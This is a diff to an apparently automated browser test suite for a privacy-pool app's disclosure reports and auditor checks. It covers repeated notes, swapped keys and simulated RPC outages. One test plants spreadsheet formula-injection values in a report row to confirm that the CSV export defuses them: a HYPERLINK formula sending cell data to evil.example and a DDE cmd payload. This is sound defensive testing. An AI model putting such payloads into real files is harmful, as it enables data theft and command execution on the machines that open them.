@@ -55,6 +55,11 @@ const N = 'latheon-testnet', CHAIN = { id: 60531373273, hex: '0xe17f374d9' }, E1
     for (const a of [100, 50, 10, 1]) cfg.pools.push({ id: N + ':LTH-' + a, network: N, version: 'v7-native', token: 'LTH', amount: a, address: pools[a].addr, deployBlock: pools[a].block });
     cfg.routers.push({ id: N + ':LTH', network: N, token: 'LTH', native: true, version: 'v7', address: router.addr, deployBlock: router.block });
     const cfgJson = JSON.stringify(cfg);
+    // Network failures on demand: a predicate over one JSON-RPC call; matching requests get HTTP 503.
+    let failMode = null;
+    const callTo = (addrs) => (q) => q.method === 'eth_call' && q.params && q.params[0] && addrs.includes(String(q.params[0].to).toLowerCase());
+    const NULLIFIER_SEL = ethers.id('nullifierHashes(uint256)').slice(0, 10);
+    const WD_TOPIC = ethers.id('Withdrawal(address,uint256,address,uint256,uint256)');
 
     browser = await chromium.launch();
     const ctx = await browser.newContext({ viewport: { width: 1280, height: 1000 }, acceptDownloads: true });
@@ -93,6 +98,7 @@ const N = 'latheon-testnet', CHAIN = { id: 60531373273, hex: '0xe17f374d9' }, E1
         const h = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': 'POST, OPTIONS' };
         if (route.request().method() === 'OPTIONS') return route.fulfill({ status: 204, headers: h });
         const body = JSON.parse(route.request().postData() || '{}');
+        if (failMode && (Array.isArray(body) ? body : [body]).some(failMode)) return route.fulfill({ status: 503, headers: h, body: 'unavailable (test)' });
         const one = async (q) => { try { return { jsonrpc: '2.0', id: q.id, result: await provider.request({ method: q.method, params: q.params }) }; } catch (e) { return { jsonrpc: '2.0', id: q.id, error: { code: e.code || -32000, message: e.message } }; } };
         const outp = Array.isArray(body) ? await Promise.all(body.map(one)) : await one(body);
         return route.fulfill({ status: 200, contentType: 'application/json', headers: h, body: JSON.stringify(outp) });
@@ -176,7 +182,7 @@ const N = 'latheon-testnet', CHAIN = { id: 60531373273, hex: '0xe17f374d9' }, E1
     rec('D6. Auditor: every note valid, made for the issued code and found on chain', /Every note in the report is valid/.test(v1.status) && v1.rows.length === 6 && v1.rows.every((c) => c[4] === '✓' && c[5] === '✓' && c[6] === '✓'), v1.status.slice(0, 80));
     const rcol = v1.rows.map((c) => c[8]), short = (a) => a.slice(0, 6) + '…' + a.slice(-4);
     rec('D7. Where the withdrawn notes went: r1 once, r2 three times; the unspent notes show no recipient', rcol.filter((x) => x === short(r1)).length === 1 && rcol.filter((x) => x === short(r2)).length === 3 && rcol.filter((x) => x === '—').length === 2, rcol.join(' '));
-    rec('D8. CSV for accounting: 6 rows, recipients, withdrawal transactions', !!v1.csv && v1.csv.trim().split('\n').length === 7 && v1.csv.includes(r1) && v1.csv.includes(r2) && /^n,network,pool,token,amount,commitment/.test(v1.csv), v1.csv ? v1.csv.split('\n')[1].slice(0, 80) : 'no csv');
+    rec('D8. CSV for accounting: 6 rows, recipients, withdrawal transactions', !!v1.csv && v1.csv.trim().split('\n').length === 7 && v1.csv.includes(r1) && v1.csv.includes(r2) && /^n,network,pool,generation,pool_frozen,token,amount,commitment/.test(v1.csv), v1.csv ? v1.csv.split('\n')[1].slice(0, 80) : 'no csv');
 
     await aud.screenshot({ path: SHOTS + '/disclosure-report-table.png', fullPage: true });
     await page.click('#tab-disclose'); await page.screenshot({ path: SHOTS + '/disclosure-report-built.png', fullPage: true });
@@ -193,7 +199,7 @@ const N = 'latheon-testnet', CHAIN = { id: 60531373273, hex: '0xe17f374d9' }, E1
     const swap = JSON.parse(r.text); const ki = swap.items.findIndex((x) => x.keys), kj = swap.items.findIndex((x, i) => x.keys && i !== ki);
     [swap.items[ki].keys, swap.items[kj].keys] = [swap.items[kj].keys, swap.items[ki].keys];
     const v4 = await verify(JSON.stringify(swap));
-    rec('D11. Keys swapped between two notes are caught ("keys do not match"), no recipient shown for them', v4.rows[ki][7] === 'keys do not match' && v4.rows[kj][7] === 'keys do not match' && v4.rows[ki][8] === '—', v4.rows[ki][7]);
+    rec('D11. Keys swapped between two notes are caught ("keys do not match"), no recipient shown, report not accepted', v4.rows[ki][7] === 'keys do not match' && v4.rows[kj][7] === 'keys do not match' && v4.rows[ki][8] === '—' && /did not pass/.test(v4.status), v4.rows[ki][7] + ' · ' + v4.status.slice(0, 40));
     const otherCode = await buildReport([noteB], '999', false);
     const v5 = await verify(otherCode.text);
     rec('D12. A report made for another code: valid proofs, but the code column fails and the report is not accepted', /did not pass/.test(v5.status) && v5.rows[0][4] === '✓' && v5.rows[0][5] === '✗', v5.rows[0].slice(4, 7).join(' '));
@@ -209,6 +215,43 @@ const N = 'latheon-testnet', CHAIN = { id: 60531373273, hex: '0xe17f374d9' }, E1
     await aud.evaluate(() => { document.getElementById('auditStatus').textContent = ''; });
     await aud.click('#auditVerifyBtn'); await aud.waitForFunction(() => /\S/.test(document.getElementById('auditStatus').textContent), null, { timeout: 300000 });
     rec('D14. The single-note disclosure still verifies in the auditor tab; no report table is left over', /verified|valid|accept/i.test(await aud.textContent('#auditStatus')) && (await aud.$$('#auditReport table')).length === 0, (await aud.textContent('#auditStatus')).trim().slice(0, 60));
+
+    // ---- fixes after the internal review of 1-2 November 2026
+    const totalLine = async () => (await aud.textContent('#auditReport p.muted')).trim();
+    const dupRep = JSON.parse(r.text); for (let i = 0; i < 3; i++) dupRep.items.push(JSON.parse(JSON.stringify(dupRep.items[0])));
+    const v6 = await verify(JSON.stringify(dupRep)), t6 = await totalLine();
+    rec('D18. A note repeated in the report: repeats marked, not counted, report refused', /repeats a note/.test(v6.status) && v6.rows.slice(6).every((c) => c[7] === 'repeat' && c[6] === '✗') && /Valid notes: 6 of 9/.test(t6) && /221 LTH/.test(t6), t6.slice(0, 70));
+    const inj = JSON.parse(rNo.text); inj.items.push(Object.assign(JSON.parse(JSON.stringify(inj.items[0])), { pool: '=HYPERLINK("https://evil.example/?x="&A1,"click")', commitment: "=cmd|' /C calc'!A0" }));
+    const v7 = await verify(JSON.stringify(inj));
+    const cells = (v7.csv || '').split('\n').flatMap((l) => l.split(',')).map((c) => c.replace(/^"/, ''));
+    rec('D19. CSV: nothing from the report that a spreadsheet would run as a formula; the bad row is refused (it copies a proof, so it is also a repeat)', !!v7.csv && !cells.some((c) => /^[=+@]/.test(c)) && !/HYPERLINK|cmd\|/.test(v7.csv) && /did not pass|repeats a note/.test(v7.status), v7.csv ? v7.csv.trim().split('\n').pop().slice(0, 80) : 'no csv');
+    failMode = callTo([verD.addr.toLowerCase()]);
+    const v8 = await verify(r.text);
+    const retryBtn = (await aud.$$('#auditRetryBtn')).length;
+    failMode = null;
+    let v8b = '';
+    if (retryBtn) { await aud.evaluate(() => { document.getElementById('auditStatus').textContent = ''; }); await aud.click('#auditRetryBtn'); await aud.waitForFunction(() => /\S/.test(document.getElementById('auditStatus').textContent), null, { timeout: 300000 }); v8b = (await aud.textContent('#auditStatus')).trim(); }
+    rec('D20. Verifier unreachable: proofs marked ?, "not a verdict", a retry button; the retry then passes', /could not be made/.test(v8.status) && v8.rows.every((c) => c[4] === '?') && retryBtn === 1 && /Every note in the report is valid/.test(v8b), v8.status.slice(0, 50) + ' → ' + v8b.slice(0, 40));
+    failMode = (q) => q.method === 'eth_call' && q.params && q.params[0] && String(q.params[0].data || q.params[0].input || '').startsWith(NULLIFIER_SEL);
+    const v9 = await verify(r.text);
+    failMode = null;
+    const keyedRows = v9.rows.filter((c) => c[7] === 'could not check (network)');
+    rec('D21. Nullifier check unreachable: keyed rows say "could not check (network)", never "keys do not match"; status is not a pass', keyedRows.length === 4 && !v9.rows.some((c) => c[7] === 'keys do not match') && /could not be made/.test(v9.status), v9.status.slice(0, 50));
+    const alt = JSON.parse(rNo.text); alt.verifierAddress = fresh(9);
+    const v10 = await verify(JSON.stringify(alt)), warnText = await aud.$$eval('#auditReport .status.warn', (els) => els.map((e) => e.textContent).join(' | '));
+    rec('D22. A report naming another verifier: checked with the official one, and a warning names the other address', /Every note in the report is valid/.test(v10.status) && warnText.includes('different verifier') && warnText.includes(fresh(9)), warnText.slice(0, 80));
+    // a deposit made after both tabs were used: still found by the user and by the auditor without reloading
+    await page.click('#tab-deposit');
+    const noteC = await fixedNote(1, noteB);
+    const rC = await buildReport([noteC], code, false);
+    const vC = rC.text ? await verify(rC.text) : { status: '' };
+    rec('D23. A deposit made after earlier reports: found in a new report and by the auditor tab without reloading', /Report ready: 1 notes?, 1 LTH/.test(rC.status) && /Every note in the report is valid/.test(vC.status), rC.status.slice(0, 40) + ' · ' + vC.status.slice(0, 40));
+    // 1b: keys only when the Withdrawal event confirms the nullifier flag
+    failMode = (q) => q.method === 'eth_getLogs' && q.params && q.params[0] && JSON.stringify(q.params[0].topics || []).toLowerCase().includes(WD_TOPIC.toLowerCase());
+    const rK = await buildReport([key, noteA, noteB], code, true);
+    failMode = null;
+    const repK = rK.text ? JSON.parse(rK.text) : { items: [] };
+    rec('D24. Withdrawal events unreachable while building: no keys added, the user is told why', repK.items.length === 6 && !repK.items.some((x) => x.keys) && /Keys not added for 4/.test(rK.status), rK.status.slice(-90));
 
     await page.selectOption('#langSelect', 'ru'); await page.click('#tab-disclose'); await page.waitForTimeout(300);
     const ruH = (await page.textContent('#reportBlock h4')).trim();
